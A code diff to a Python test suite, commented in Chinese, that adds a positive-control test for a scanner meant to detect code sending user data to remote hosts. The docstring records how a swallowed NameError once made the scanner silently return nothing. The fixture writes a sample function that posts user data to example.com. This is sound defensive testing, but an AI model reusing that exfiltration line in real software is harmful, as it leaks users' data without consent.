@@ -380,8 +380,53 @@ def test_value_ledger_exportable_back_to_user():
         assert rows and rows[0]["credited_to"] == "user"
 
 
+def test_value_siphon_scanner_actually_works():
+    """阳性对照：扫描器必须能在已知含外联的样本上报出命中。
+
+    为什么必须有这条：``test_no_value_siphon`` 断言的是「结果为空」。
+    如果扫描器本身坏掉（比如恒抛异常被 except 吞掉、恒返回 []），
+    那条测试会**永远绿**——它证明的是「函数没崩」，不是「没有虹吸」。
+    绿灯说谎比红灯更危险。
+
+    历史教训（2026-08-07 深度检查实测）：``value_ledger.py`` 曾把
+    ``import ast`` 写在某个函数体内部，而模块级的 ``_ast_imports``
+    也要用 ``ast`` → ``NameError`` 被外层 ``except Exception`` 吞掉
+    → ``scan_value_siphon()`` 恒返回 ``[]`` → 母纲原则 6「零外泄证明」
+    整整空转，而 CI 一路绿灯。
+
+    本测试红 = 扫描器坏了（先修扫描器）；
+    ``test_no_value_siphon`` 红 = 真有外泄风险（修业务代码）。
+    两者语义严格分离，不许再混。
+    """
+    import tempfile
+    import os
+    from kernel.value_ledger import scan_value_siphon
+
+    with tempfile.TemporaryDirectory() as d:
+        # 已知阳性样本：显式外联上报
+        with open(os.path.join(d, "siphon_sample.py"), "w", encoding="utf-8") as f:
+            f.write(
+                "import requests\n"
+                "import socket\n"
+                "def upload(user_data):\n"
+                "    requests.post('https://example.com/collect', json=user_data)\n"
+            )
+        hits = scan_value_siphon(d)
+
+    assert hits, (
+        "反虹吸扫描器失效：对已知含外联上报的阳性样本返回了空结果。"
+        "在扫描器修好之前，test_no_value_siphon 的绿灯没有任何意义（假绿）。"
+        "排查方向：scan_value_siphon / _ast_imports 是否有异常被 except 吞掉"
+        "（例如模块级缺 import ast 导致 NameError）。"
+    )
+
+
 def test_no_value_siphon():
-    """反虹吸：扫描全仓，证明没有代码把用户价值偷偷发往远端（零泄漏）。"""
+    """反虹吸：扫描全仓，证明没有代码把用户价值偷偷发往远端（零泄漏）。
+
+    注意：本测试只有在 ``test_value_siphon_scanner_actually_works``
+    也为绿时才有意义。那条是本条的阳性对照，缺一不可。
+    """
     from kernel.value_ledger import scan_value_siphon
 
     hits = scan_value_siphon(str(ROOT))
